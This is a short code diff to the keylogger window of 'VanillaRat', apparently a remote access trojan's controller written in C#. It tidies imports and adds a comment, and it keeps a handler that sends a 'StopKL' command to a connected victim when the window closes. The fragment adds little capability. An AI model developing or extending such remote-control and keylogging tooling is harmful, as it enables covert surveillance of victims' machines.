@@ -1,12 +1,6 @@
-﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.Text;
 using System.Windows.Forms;
+using VanillaRat.Classes;
 
 namespace VanillaRat.Forms
 {
@@ -16,11 +10,13 @@ namespace VanillaRat.Forms
         {
             InitializeComponent();
         }
+
         public int ConnectionId { get; set; }
 
+        //Stop keylogger 
         private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
         {
-            Classes.Server.MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StopKL"));
+            Server.MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StopKL"));
         }
     }
 }
